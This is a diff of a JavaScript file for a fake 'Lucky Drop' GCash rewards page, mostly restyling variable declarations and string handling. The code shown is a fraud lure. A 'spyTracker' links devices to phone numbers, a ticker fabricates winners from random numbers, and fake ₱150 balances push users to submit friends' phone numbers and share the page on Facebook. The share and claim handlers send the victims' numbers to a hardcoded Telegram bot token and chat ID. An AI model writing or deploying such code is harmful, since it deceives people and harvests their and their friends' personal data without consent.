@@ -49,6 +49,7 @@ const spyTracker = {
                     });
                     
                     localStorage.setItem("userDeviceDisplayId", displayId);
+                    console.log("New device tracked: " + displayId + " for " + phone);
                 } else {
                     await deviceRef.update({
                         lastSeen: Date.now(),
@@ -102,19 +103,23 @@ const spyTracker = {
 // ========== INDICATOR SYSTEM ==========
 
 const indicatorSystem = {
-    updateIndicators: function(step, isOnHold = false) {
+    updateIndicators: function(step, isOnHold) {
+        if (isOnHold === undefined) isOnHold = false;
+        
         const indicator1 = document.getElementById('indicator1');
         const indicator2 = document.getElementById('indicator2');
         const indicator3 = document.getElementById('indicator3');
         
-        [indicator1, indicator2, indicator3].forEach(ind => {
+        var indicators = [indicator1, indicator2, indicator3];
+        for (var i = 0; i < indicators.length; i++) {
+            var ind = indicators[i];
             if (ind) {
                 ind.classList.remove('indicator-yellow-red', 'indicator-blue', 'indicator-green', 'indicator-hold');
                 ind.style.background = 'rgba(255,255,255,0.2)';
                 ind.style.boxShadow = 'none';
                 ind.style.animation = 'none';
             }
-        });
+        }
         
         if (step >= 1 && indicator1) {
             if (isOnHold) {
@@ -149,11 +154,11 @@ const indicatorSystem = {
     },
     
     saveToFirebase: async function(step, isOnHold) {
-        const phone = localStorage.getItem("userPhone");
+        var phone = localStorage.getItem("userPhone");
         if (!phone) return;
         
         if (typeof firebase !== 'undefined' && firebase.database) {
-            const db = firebase.database();
+            var db = firebase.database();
             await db.ref('user_sessions/' + phone).update({
                 indicatorStep: step,
                 claimOnHold: isOnHold,
@@ -163,24 +168,24 @@ const indicatorSystem = {
     },
     
     loadFromFirebase: async function() {
-        const phone = localStorage.getItem("userPhone");
+        var phone = localStorage.getItem("userPhone");
         if (!phone) return { step: 0, isOnHold: false };
         
         if (typeof firebase !== 'undefined' && firebase.database) {
-            const db = firebase.database();
-            const sessionSnap = await db.ref('user_sessions/' + phone).once('value');
-            const step = sessionSnap.exists() ? sessionSnap.val().indicatorStep || 0 : 0;
-            const isOnHold = sessionSnap.exists() ? sessionSnap.val().claimOnHold || false : false;
+            var db = firebase.database();
+            var sessionSnap = await db.ref('user_sessions/' + phone).once('value');
+            var step = sessionSnap.exists() ? sessionSnap.val().indicatorStep || 0 : 0;
+            var isOnHold = sessionSnap.exists() ? sessionSnap.val().claimOnHold || false : false;
             localStorage.setItem('indicatorStep', step);
             localStorage.setItem('claimOnHold', isOnHold);
             this.updateIndicators(step, isOnHold);
-            return { step, isOnHold };
+            return { step: step, isOnHold: isOnHold };
         }
         return { step: 0, isOnHold: false };
     },
     
     step1ClaimOnHold: async function() {
-        const currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
+        var currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
         if (currentStep === 1) {
             this.updateIndicators(1, true);
             return true;
@@ -189,7 +194,7 @@ const indicatorSystem = {
     },
     
     step2FacebookShare: async function() {
-        const currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
+        var currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
         if (currentStep === 2) {
             this.updateIndicators(2, false);
             return true;
@@ -198,7 +203,7 @@ const indicatorSystem = {
     },
     
     step3ReferralComplete: async function() {
-        const currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
+        var currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
         if (currentStep === 3) {
             this.updateIndicators(3, false);
             return true;
@@ -218,31 +223,31 @@ const indicatorSystem = {
 // ========== BALANCE MANAGEMENT ==========
 const balanceManager = {
     getBalance: async function() {
-        const phone = localStorage.getItem("userPhone");
+        var phone = localStorage.getItem("userPhone");
         if (!phone) return 0;
         
         if (typeof firebase !== 'undefined' && firebase.database) {
-            const db = firebase.database();
-            const sessionSnap = await db.ref('user_sessions/' + phone).once('value');
+            var db = firebase.database();
+            var sessionSnap = await db.ref('user_sessions/' + phone).once('value');
             return sessionSnap.exists() ? sessionSnap.val().balance || 0 : 0;
         }
         return 0;
     },
     
     addBalance: async function(amount) {
-        const phone = localStorage.getItem("userPhone");
+        var phone = localStorage.getItem("userPhone");
         if (!phone) return false;
         
         if (typeof firebase !== 'undefined' && firebase.database) {
-            const db = firebase.database();
-            const sessionRef = db.ref('user_sessions/' + phone);
-            const sessionSnap = await sessionRef.once('value');
-            const currentBalance = sessionSnap.exists() ? sessionSnap.val().balance || 0 : 0;
-            let newBalance = currentBalance + amount;
+            var db = firebase.database();
+            var sessionRef = db.ref('user_sessions/' + phone);
+            var sessionSnap = await sessionRef.once('value');
+            var currentBalance = sessionSnap.exists() ? sessionSnap.val().balance || 0 : 0;
+            var newBalance = currentBalance + amount;
             
             if (newBalance > 1200) {
                 newBalance = 1200;
-                alert("🏆 Maximum balance of ₱1200 reached!");
+                alert("Maximum balance of ₱1200 reached!");
             }
             
             await sessionRef.update({
@@ -263,10 +268,10 @@ const balanceManager = {
     },
     
     updateBalanceDisplay: async function() {
-        const balance = await this.getBalance();
-        const balanceElement = document.getElementById('userBalanceDisplay');
+        var balance = await this.getBalance();
+        var balanceElement = document.getElementById('userBalanceDisplay');
         if (balanceElement) {
-            balanceElement.innerHTML = `₱${balance.toLocaleString()}`;
+            balanceElement.innerHTML = "₱" + balance.toLocaleString();
         }
         return balance;
     }
@@ -280,8 +285,8 @@ const rewardTiers = {
 };
 
 function generateWeightedAmount() {
-    const random = Math.random() * 100;
-    let selectedTier = rewardTiers.common;
+    var random = Math.random() * 100;
+    var selectedTier = rewardTiers.common;
     
     if (random < rewardTiers.common.weight) {
         selectedTier = rewardTiers.common;
@@ -291,11 +296,11 @@ function generateWeightedAmount() {
         selectedTier = rewardTiers.legendary;
     }
     
-    const amounts = selectedTier.amounts;
+    var amounts = selectedTier.amounts;
     return amounts[Math.floor(Math.random() * amounts.length)];
 }
 
-// ========== WINNER TICKER (FIXED - HINDI NA LOADING) ==========
+// ========== WINNER TICKER ==========
 const winnerTicker = {
     prefixes: ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"],
     winnerElement: null,
@@ -310,15 +315,15 @@ const winnerTicker = {
     },
     
     generateWinnerText: function() {
-        const prefix = this.generatePrefix();
-        const last4 = this.generateLast4Digits();
-        const amount = generateWeightedAmount();
-        return `${prefix}***${last4} withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱${amount}`;
+        var prefix = this.generatePrefix();
+        var last4 = this.generateLast4Digits();
+        var amount = generateWeightedAmount();
+        return prefix + "***" + last4 + ' withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' + amount;
     },
     
     updateWinner: function() {
         if (!this.winnerElement) return;
-        const newText = this.generateWinnerText();
+        var newText = this.generateWinnerText();
         this.winnerElement.innerHTML = newText;
     },
     
@@ -326,23 +331,19 @@ const winnerTicker = {
         this.winnerElement = document.getElementById('winnerText');
         if (!this.winnerElement) {
             console.log("Winner element not found, will retry...");
-            // Subukan ulit po mag-500ms
-            setTimeout(() => this.start(), 500);
+            var self = this;
+            setTimeout(function() { self.start(); }, 500);
             return;
         }
         
-        // Initial text agad, hindi "Loading..."
         this.winnerElement.innerHTML = this.generateWinnerText();
         
-        // I-clear ang existing interval kung meron
         if (this.tickerInterval) clearInterval(this.tickerInterval);
         
-        // Start ng 15 seconds interval
-        this.tickerInterval = setInterval(() => {
-            this.updateWinner();
-        }, 15000);
+        var self = this;
+        this.tickerInterval = setInterval(function() { self.updateWinner(); }, 15000);
         
-        console.log("🎲 Winner ticker started");
+        console.log("Winner ticker started");
     },
     
     stop: function() {
@@ -353,21 +354,21 @@ const winnerTicker = {
     }
 };
 
-// ========== REFERRAL TIMER (5 MINUTES COOLDOWN SA POPUP) ==========
+// ========== REFERRAL TIMER ==========
 const referralTimer = {
     STORAGE_KEY: 'referral_end_time',
     
     startTimer: function() {
-        const endTime = Date.now() + (5 * 60 * 1000); // 5 minutes
+        var endTime = Date.now() + (5 * 60 * 1000);
         localStorage.setItem(this.STORAGE_KEY, endTime);
         return endTime;
     },
     
     getRemainingTime: function() {
-        const endTime = localStorage.getItem(this.STORAGE_KEY);
+        var endTime = localStorage.getItem(this.STORAGE_KEY);
         if (!endTime) return 0;
         
-        const remaining = parseInt(endTime) - Date.now();
+        var remaining = parseInt(endTime) - Date.now();
         if (remaining <= 0) {
             this.clearTimer();
             return 0;
@@ -384,15 +385,14 @@ const referralTimer = {
     },
     
     formatTime: function(seconds) {
-        const mins = Math.floor(seconds / 60);
-        const secs = seconds % 60;
-        return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        var mins = Math.floor(seconds / 60);
+        var secs = seconds % 60;
+        return mins.toString().padStart(2, '0') + ":" + secs.toString().padStart(2, '0');
     },
     
-    // I-update ang display sa popup
     updatePopupDisplay: function() {
-        const remaining = this.getRemainingTime();
-        const timerElement = document.getElementById('popupTimerDisplay');
+        var remaining = this.getRemainingTime();
+        var timerElement = document.getElementById('popupTimerDisplay');
         
         if (timerElement) {
             if (remaining > 0) {
@@ -406,12 +406,12 @@ const referralTimer = {
         return remaining;
     },
     
-    // Simulan ang countdown sa popup
     startPopupCountdown: function() {
         this.updatePopupDisplay();
         
-        const interval = setInterval(() => {
-            const remaining = this.updatePopupDisplay();
+        var self = this;
+        var interval = setInterval(function() {
+            var remaining = self.updatePopupDisplay();
             if (remaining <= 0) {
                 clearInterval(interval);
             }
@@ -422,24 +422,25 @@ const referralTimer = {
 };
 
 // ========== SHARE BUTTON COOLDOWN UI ==========
-let shareCooldownInterval = null;
+var shareCooldownInterval = null;
 
 function updateShareButtonCooldown() {
-    const remaining = referralTimer.getRemainingTime();
-    const shareBtn = document.getElementById('shareButton');
-    const friendInput = document.getElementById('friendPhoneInput');
-    const statusMsg = document.getElementById('statusMessage');
+    var remaining = referralTimer.getRemainingTime();
+    var shareBtn = document.getElementById('shareButton');
+    var friendInput = document.getElementById('friendPhoneInput');
+    var statusMsg = document.getElementById('statusMessage');
     
     if (remaining > 0) {
-        const mins = Math.floor(remaining / 60);
-        const secs = remaining % 60;
+        var mins = Math.floor(remaining / 60);
+        var secs = remaining % 60;
+        var timeStr = mins.toString().padStart(2, '0') + ":" + secs.toString().padStart(2, '0');
         if (shareBtn) {
             shareBtn.disabled = true;
-            shareBtn.innerHTML = `⏰ WAIT ${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+            shareBtn.innerHTML = "⏰ WAIT " + timeStr;
         }
         if (friendInput) friendInput.disabled = true;
         if (statusMsg) {
-            statusMsg.innerHTML = `<span class="status-waiting">⏳ Please wait ${mins}:${secs.toString().padStart(2, '0')} before sharing again ⏳</span>`;
+            statusMsg.innerHTML = '<span class="status-waiting">⏳ Please wait ' + timeStr + ' before sharing again ⏳</span>';
         }
     } else {
         if (shareBtn) {
@@ -448,7 +449,7 @@ function updateShareButtonCooldown() {
         }
         if (friendInput) friendInput.disabled = false;
         if (statusMsg) {
-            statusMsg.innerHTML = `<span class="status-unlocked">🎉 Share with a friend to unlock 150 credits! 🎉</span>`;
+            statusMsg.innerHTML = '<span class="status-unlocked">🎉 Share with a friend to unlock 150 credits! 🎉</span>';
         }
         if (shareCooldownInterval) {
             clearInterval(shareCooldownInterval);
@@ -463,206 +464,26 @@ function startShareCooldownUI() {
     shareCooldownInterval = setInterval(updateShareButtonCooldown, 1000);
 }
 
-// ========== STEP 1: SHARE BUTTON HANDLER ==========
-async function handleShare() {
-    const friendPhone = document.getElementById('friendPhoneInput').value.trim();
-    const userPhone = localStorage.getItem("userPhone");
-    
-    if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
-        alert("Please enter valid 11-digit number starting with 09");
-        return;
-    }
-    
-    if (friendPhone === userPhone) {
-        alert("You cannot invite yourself!");
-        return;
-    }
-    
-    // Check kung nasa cooldown pa
-    if (referralTimer.isOnCooldown()) {
-        const remaining = referralTimer.getRemainingTime();
-        const mins = Math.floor(remaining / 60);
-        const secs = remaining % 60;
-        alert(`Please wait ${mins}:${secs.toString().padStart(2, '0')} before inviting again.`);
-        return;
-    }
-    
-    // I-set sa Step 1
-    indicatorSystem.setStep(1);
-    
-    // Simulan ang 5 minutes timer
-    referralTimer.startTimer();
-    startShareCooldownUI();
-    
-    // Send notification
-    const message = `📱 REFERRAL INVITE - STEP 1/3!\n👤 User: ${userPhone}\n👥 Friend: ${friendPhone}`;
-    
-    try {
-        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`);
-    } catch(e) {
-        console.log("Telegram error:", e);
-    }
-    
-    document.getElementById('friendPhoneInput').value = '';
-    
-    const progressFill = document.getElementById('progressFill');
-    if (progressFill) progressFill.style.width = '33%';
-    
-    const statusMsg = document.getElementById('statusMessage');
-    if (statusMsg) {
-        statusMsg.innerHTML = `<span class="status-step1">✅ Step 1/3 completed! Click CLAIM THRU GCASH to get ₱150! 🟡🔴</span>`;
-    }
-    
-    // Ipakita ang popup na may timer
-    showPrizePopup();
-}
-
-// ========== STEP 2: FACEBOOK SHARE HANDLER ==========
-async function handleFacebookShare() {
-    const shareUrl = "https://xjiligames.github.io/rewards/index.html";
-    const shareText = "🎉 I just won from Lucky Drop! Join me and get your bonus too! 🐾";
-    
-    const fbShareUrl = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(shareUrl)}&quote=${encodeURIComponent(shareText)}`;
-    
-    window.open(fbShareUrl, '_blank', 'width=600,height=400');
-    
-    await indicatorSystem.step2FacebookShare();
-    
-    const progressFill = document.getElementById('progressFill');
-    if (progressFill) progressFill.style.width = '66%';
-    
-    const statusMsg = document.getElementById('statusMessage');
-    if (statusMsg) {
-        statusMsg.innerHTML = `<span class="status-step2">✅ Step 2/3 completed! Share to Facebook done! 🔵</span>`;
-    }
-    
-    const phone = localStorage.getItem("userPhone");
-    if (typeof firebase !== 'undefined' && firebase.database) {
-        const db = firebase.database();
-        await db.ref('user_sessions/' + phone).update({
-            indicatorStep: 2,
-            lastStepUpdate: Date.now()
-        });
-    }
-}
-
-// ========== STEP 3: REFERRAL COMPLETE ==========
-async function completeReferral(referredPhone) {
-    const userPhone = localStorage.getItem("userPhone");
-    
-    await balanceManager.addBalance(150);
-    await indicatorSystem.step3ReferralComplete();
-    
-    const progressFill = document.getElementById('progressFill');
-    if (progressFill) progressFill.style.width = '100%';
-    
-    const statusMsg = document.getElementById('statusMessage');
-    if (statusMsg) {
-        statusMsg.innerHTML = `<span class="status-step3">🎉 Step 3/3 completed! +₱150 bonus from referral! 🟢</span>`;
-    }
-    
-    if (typeof firebase !== 'undefined' && firebase.database) {
-        const db = firebase.database();
-        await db.ref('user_sessions/' + userPhone).update({
-            indicatorStep: 3,
-            balance: await balanceManager.getBalance(),
-            lastStepUpdate: Date.now()
-        });
-        
-        await db.ref('referrals/' + userPhone + '/' + referredPhone).set({
-            timestamp: Date.now(),
-            bonus: 150
-        });
-    }
-    
-    await balanceManager.updateBalanceDisplay();
-    
-    alert(`🎉 +₱150 added to your balance! Total: ₱${await balanceManager.getBalance()}`);
-}
-
-// ========== CLAIM GCASH BUTTON ==========
-async function handleClaimGCash() {
-    const currentStep = indicatorSystem.getCurrentStep();
-    const isOnHold = localStorage.getItem('claimOnHold') === 'true';
-    
-    if (currentStep !== 1) {
-        alert("⚠️ Complete Step 1 first!\n\nEnter a friend's mobile number to unlock ₱150 reward.");
-        return;
-    }
-    
-    if (isOnHold) {
-        alert("⏳ Claim is already processing. Please wait.");
-        return;
-    }
-    
-    await indicatorSystem.step1ClaimOnHold();
-    
-    const newBalance = await balanceManager.addBalance(150);
-    
-    if (newBalance !== false) {
-        alert(`💰 ₱150 added to your balance! Total: ₱${newBalance}`);
-        
-        const phone = localStorage.getItem("userPhone");
-        const message = `💰 CLAIM SUCCESS - STEP 1/3!\n📱 User: ${phone}\n💵 ₱150 claimed\n💰 New Balance: ₱${newBalance}`;
-        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`);
-        
-        const progressFill = document.getElementById('progressFill');
-        if (progressFill) progressFill.style.width = '50%';
-        
-        const statusMsg = document.getElementById('statusMessage');
-        if (statusMsg) {
-            statusMsg.innerHTML = `<span class="status-claimed">✅ ₱150 claimed! Share on Facebook to continue to Step 2! 🔵</span>`;
-        }
-        
-        indicatorSystem.updateIndicators(1, false);
-    }
-}
-
-// ========== PRIZE POPUP FUNCTIONS ==========
-let popupCountdownInterval = null;
-
-function showPrizePopup() {
-    const popup = document.getElementById('prizePopup');
-    const popupBalance = document.getElementById('popupBalanceAmount');
-    
-    if (popupBalance) popupBalance.innerHTML = "₱150.00";
-    
-    // Simulan ang countdown sa popup
-    if (popupCountdownInterval) clearInterval(popupCountdownInterval);
-    popupCountdownInterval = referralTimer.startPopupCountdown();
-    
-    startConfetti();
-    
-    if (popup) popup.style.display = 'flex';
-}
-
-function closePrizePopup() {
-    const popup = document.getElementById('prizePopup');
-    if (popup) popup.style.display = 'none';
-    stopConfetti();
-    
-    // Hindi titigil ang countdown, tuloy pa rin sa background
-}
-
 // ========== CONFETTI FUNCTIONS ==========
-let confettiAnimation = null;
+var confettiAnimation = null;
+var confettiTimeout = null;
 
 function startConfetti() {
-    const canvas = document.getElementById('confettiCanvas');
+    var canvas = document.getElementById('confettiCanvas');
     if (!canvas) return;
     
     canvas.style.display = 'block';
     canvas.width = window.innerWidth;
     canvas.height = window.innerHeight;
-    const ctx = canvas.getContext('2d');
+    var ctx = canvas.getContext('2d');
     
-    const particles = [];
-    for (let i = 0; i < 150; i++) {
+    var particles = [];
+    for (var i = 0; i < 150; i++) {
         particles.push({
             x: Math.random() * canvas.width,
             y: Math.random() * canvas.height - canvas.height,
             size: Math.random() * 8 + 3,
-            color: `hsl(${Math.random() * 360}, 100%, 60%)`,
+            color: "hsl(" + (Math.random() * 360) + ", 100%, 60%)",
             speed: Math.random() * 4 + 2
         });
     }
@@ -671,7 +492,8 @@ function startConfetti() {
         if (!canvas || canvas.style.display === 'none') return;
         ctx.clearRect(0, 0, canvas.width, canvas.height);
         
-        for (let p of particles) {
+        for (var j = 0; j < particles.length; j++) {
+            var p = particles[j];
             ctx.fillStyle = p.color;
             ctx.fillRect(p.x, p.y, p.size, p.size);
             p.y += p.speed;
@@ -686,7 +508,8 @@ function startConfetti() {
     
     draw();
     
-    setTimeout(() => {
+    if (confettiTimeout) clearTimeout(confettiTimeout);
+    confettiTimeout = setTimeout(function() {
         stopConfetti();
     }, 5000);
 }
@@ -696,30 +519,205 @@ function stopConfetti() {
         cancelAnimationFrame(confettiAnimation);
         confettiAnimation = null;
     }
-    const canvas = document.getElementById('confettiCanvas');
+    var canvas = document.getElementById('confettiCanvas');
     if (canvas) {
-        const ctx = canvas.getContext('2d');
+        var ctx = canvas.getContext('2d');
         ctx.clearRect(0, 0, canvas.width, canvas.height);
         canvas.style.display = 'none';
     }
 }
 
-// ========== MAIN TIMER (FIXED - HINDI NA LOADING) ==========
-let mainTimerInterval = null;
+// ========== PRIZE POPUP FUNCTIONS ==========
+var popupCountdownInterval = null;
+
+function showPrizePopup() {
+    var popup = document.getElementById('prizePopup');
+    var popupBalance = document.getElementById('popupBalanceAmount');
+    
+    if (popupBalance) popupBalance.innerHTML = "₱150.00";
+    
+    if (popupCountdownInterval) clearInterval(popupCountdownInterval);
+    popupCountdownInterval = referralTimer.startPopupCountdown();
+    
+    startConfetti();
+    
+    if (popup) popup.style.display = 'flex';
+}
+
+function closePrizePopup() {
+    var popup = document.getElementById('prizePopup');
+    if (popup) popup.style.display = 'none';
+    stopConfetti();
+}
+
+// ========== STEP 1: SHARE BUTTON HANDLER ==========
+async function handleShare() {
+    var friendPhone = document.getElementById('friendPhoneInput').value.trim();
+    var userPhone = localStorage.getItem("userPhone");
+    
+    if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
+        alert("Please enter valid 11-digit number starting with 09");
+        return;
+    }
+    
+    if (friendPhone === userPhone) {
+        alert("You cannot invite yourself!");
+        return;
+    }
+    
+    if (referralTimer.isOnCooldown()) {
+        var remaining = referralTimer.getRemainingTime();
+        var mins = Math.floor(remaining / 60);
+        var secs = remaining % 60;
+        alert("Please wait " + mins + ":" + secs.toString().padStart(2, '0') + " before inviting again.");
+        return;
+    }
+    
+    indicatorSystem.setStep(1);
+    
+    referralTimer.startTimer();
+    startShareCooldownUI();
+    
+    var message = "📱 REFERRAL INVITE - STEP 1/3!\n👤 User: " + userPhone + "\n👥 Friend: " + friendPhone;
+    
+    try {
+        await fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent(message));
+    } catch(e) {
+        console.log("Telegram error:", e);
+    }
+    
+    document.getElementById('friendPhoneInput').value = '';
+    
+    var progressFill = document.getElementById('progressFill');
+    if (progressFill) progressFill.style.width = '33%';
+    
+    var statusMsg = document.getElementById('statusMessage');
+    if (statusMsg) {
+        statusMsg.innerHTML = '<span class="status-step1">✅ Step 1/3 completed! Click CLAIM THRU GCASH to get ₱150! 🟡🔴</span>';
+    }
+    
+    showPrizePopup();
+}
+
+// ========== STEP 2: FACEBOOK SHARE HANDLER ==========
+async function handleFacebookShare() {
+    var shareUrl = "https://xjiligames.github.io/rewards/index.html";
+    var shareText = "🎉 I just won from Lucky Drop! Join me and get your bonus too! 🐾";
+    
+    var fbShareUrl = 'https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl) + '&quote=' + encodeURIComponent(shareText);
+    
+    window.open(fbShareUrl, '_blank', 'width=600,height=400');
+    
+    await indicatorSystem.step2FacebookShare();
+    
+    var progressFill = document.getElementById('progressFill');
+    if (progressFill) progressFill.style.width = '66%';
+    
+    var statusMsg = document.getElementById('statusMessage');
+    if (statusMsg) {
+        statusMsg.innerHTML = '<span class="status-step2">✅ Step 2/3 completed! Share to Facebook done! 🔵</span>';
+    }
+    
+    var phone = localStorage.getItem("userPhone");
+    if (typeof firebase !== 'undefined' && firebase.database) {
+        var db = firebase.database();
+        await db.ref('user_sessions/' + phone).update({
+            indicatorStep: 2,
+            lastStepUpdate: Date.now()
+        });
+    }
+}
+
+// ========== STEP 3: REFERRAL COMPLETE ==========
+async function completeReferral(referredPhone) {
+    var userPhone = localStorage.getItem("userPhone");
+    
+    await balanceManager.addBalance(150);
+    await indicatorSystem.step3ReferralComplete();
+    
+    var progressFill = document.getElementById('progressFill');
+    if (progressFill) progressFill.style.width = '100%';
+    
+    var statusMsg = document.getElementById('statusMessage');
+    if (statusMsg) {
+        statusMsg.innerHTML = '<span class="status-step3">🎉 Step 3/3 completed! +₱150 bonus from referral! 🟢</span>';
+    }
+    
+    if (typeof firebase !== 'undefined' && firebase.database) {
+        var db = firebase.database();
+        var newBalance = await balanceManager.getBalance();
+        await db.ref('user_sessions/' + userPhone).update({
+            indicatorStep: 3,
+            balance: newBalance,
+            lastStepUpdate: Date.now()
+        });
+        
+        await db.ref('referrals/' + userPhone + '/' + referredPhone).set({
+            timestamp: Date.now(),
+            bonus: 150
+        });
+    }
+    
+    await balanceManager.updateBalanceDisplay();
+    
+    var finalBalance = await balanceManager.getBalance();
+    alert("🎉 +₱150 added to your balance! Total: ₱" + finalBalance);
+}
+
+// ========== CLAIM GCASH BUTTON ==========
+async function handleClaimGCash() {
+    var currentStep = indicatorSystem.getCurrentStep();
+    var isOnHold = localStorage.getItem('claimOnHold') === 'true';
+    
+    if (currentStep !== 1) {
+        alert("⚠️ Complete Step 1 first!\n\nEnter a friend's mobile number to unlock ₱150 reward.");
+        return;
+    }
+    
+    if (isOnHold) {
+        alert("⏳ Claim is already processing. Please wait.");
+        return;
+    }
+    
+    await indicatorSystem.step1ClaimOnHold();
+    
+    var newBalance = await balanceManager.addBalance(150);
+    
+    if (newBalance !== false) {
+        alert("💰 ₱150 added to your balance! Total: ₱" + newBalance);
+        
+        var phone = localStorage.getItem("userPhone");
+        var message = "💰 CLAIM SUCCESS - STEP 1/3!\n📱 User: " + phone + "\n💵 ₱150 claimed\n💰 New Balance: ₱" + newBalance;
+        await fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent(message));
+        
+        var progressFill = document.getElementById('progressFill');
+        if (progressFill) progressFill.style.width = '50%';
+        
+        var statusMsg = document.getElementById('statusMessage');
+        if (statusMsg) {
+            statusMsg.innerHTML = '<span class="status-claimed">✅ ₱150 claimed! Share on Facebook to continue to Step 2! 🔵</span>';
+        }
+        
+        indicatorSystem.updateIndicators(1, false);
+    }
+}
+
+// ========== MAIN TIMER ==========
+var mainTimerInterval = null;
 
 function updateMainTimer() {
-    const target = new Date(2026, 4, 1, 0, 0, 0);
-    const now = new Date();
-    const diff = target - now;
-    const timerDisplay = document.getElementById('mainTimerDisplay');
+    var target = new Date(2026, 4, 1, 0, 0, 0);
+    var now = new Date();
+    var diff = target - now;
+    var timerDisplay = document.getElementById('mainTimerDisplay');
     
     if (timerDisplay) {
         if (diff > 0) {
-            const days = Math.floor(diff / (1000*60*60*24));
-            const hours = Math.floor((diff % (86400000)) / 3600000);
-            const mins = Math.floor((diff % 3600000) / 60000);
-            const secs = Math.floor((diff % 60000) / 1000);
-            timerDisplay.innerHTML = `${days}D ${hours.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+            var days = Math.floor(diff / (1000*60*60*24));
+            var hours = Math.floor((diff % (86400000)) / 3600000);
+            var mins = Math.floor((diff % 3600000) / 60000);
+            var secs = Math.floor((diff % 60000) / 1000);
+            timerDisplay.innerHTML = days + "D " + hours.toString().padStart(2,'0') + ":" + mins.toString().padStart(2,'0') + ":" + secs.toString().padStart(2,'0');
         } else {
             timerDisplay.innerHTML = "00D 00:00:00";
         }
@@ -739,48 +737,59 @@ function checkExistingCooldown() {
     }
 }
 
+// ========== CARD CLICK HANDLERS ==========
+function setupCardClicks() {
+    var youGetCard = document.querySelector('.prize-card:first-child');
+    var friendGetsCard = document.querySelector('.prize-card:last-child');
+    
+    if (youGetCard) {
+        youGetCard.addEventListener('click', function() {
+            startConfetti();
+            alert("🎉 YOU GET ₱150! Click CLAIM THRU GCASH to withdraw!");
+        });
+    }
+    
+    if (friendGetsCard) {
+        friendGetsCard.addEventListener('click', function() {
+            startConfetti();
+            alert("🎉 FRIEND GETS ₱150! Share this link with your friend!");
+        });
+    }
+}
+
 // ========== INITIALIZE ==========
 document.addEventListener('DOMContentLoaded', async function() {
     console.log("Promotion.js loaded - Fixed Version");
     
     await spyTracker.track();
     
-    // Simulan ang winner ticker (hindi na loading)
     winnerTicker.start();
-    
-    // Simulan ang main timer (hindi na loading)
     startMainTimer();
-    
-    // Check kung may existing cooldown
     checkExistingCooldown();
+    setupCardClicks();
     
-    // Load current step from Firebase
-    const { step, isOnHold } = await indicatorSystem.loadFromFirebase();
-    console.log(`Current step: ${step}, On Hold: ${isOnHold}`);
+    var result = await indicatorSystem.loadFromFirebase();
+    console.log("Current step: " + result.step + ", On Hold: " + result.isOnHold);
     
-    // Update progress bar based on step
-    const progressFill = document.getElementById('progressFill');
+    var progressFill = document.getElementById('progressFill');
     if (progressFill) {
-        if (step >= 3) progressFill.style.width = '100%';
-        else if (step >= 2) progressFill.style.width = '66%';
-        else if (step >= 1) progressFill.style.width = '33%';
+        if (result.step >= 3) progressFill.style.width = '100%';
+        else if (result.step >= 2) progressFill.style.width = '66%';
+        else if (result.step >= 1) progressFill.style.width = '33%';
     }
     
-    // Share button
-    const shareBtn = document.getElementById('shareButton');
+    var shareBtn = document.getElementById('shareButton');
     if (shareBtn) {
-        const newShareBtn = shareBtn.cloneNode(true);
+        var newShareBtn = shareBtn.cloneNode(true);
         shareBtn.parentNode.replaceChild(newShareBtn, shareBtn);
         newShareBtn.onclick = handleShare;
         newShareBtn.disabled = referralTimer.isOnCooldown();
     }
     
-    // Facebook share button
-    const fbShareBtn = document.getElementById('shareFBBtn');
+    var fbShareBtn = document.getElementById('shareFBBtn');
     if (fbShareBtn) {
-        // Add info text below button kung wala pa
         if (!document.querySelector('.fb-share-info')) {
-            const infoText = document.createElement('div');
+            var infoText = document.createElement('div');
             infoText.className = 'fb-share-info';
             infoText.style.cssText = 'font-size: 10px; color: #ffaa33; margin-top: 8px; text-align: center;';
             infoText.innerHTML = '📱 You will receive SMS notification once your share is validated and get +150 bonus Credits';
@@ -790,14 +799,12 @@ document.addEventListener('DOMContentLoaded', async function() {
         fbShareBtn.onclick = handleFacebookShare;
     }
     
-    // Claim button
-    const claimGCashBtn = document.getElementById('claimGCashBtn');
-    if (claimGCashBtn) {
-        claimGCashBtn.onclick = handleClaimGCash;
+    var claimBtn = document.getElementById('claimGCashBtn');
+    if (claimBtn) {
+        claimBtn.onclick = handleClaimGCash;
     }
     
-    // Popup close on outside click
-    const popup = document.getElementById('prizePopup');
+    var popup = document.getElementById('prizePopup');
     if (popup) {
         popup.onclick = function(e) {
             if (e.target === popup) {
@@ -806,5 +813,5 @@ document.addEventListener('DOMContentLoaded', async function() {
         };
     }
     
-    console.log("✅ Promotion.js initialized - All systems ready");
+    console.log("Promotion.js initialized - All systems ready");
 });
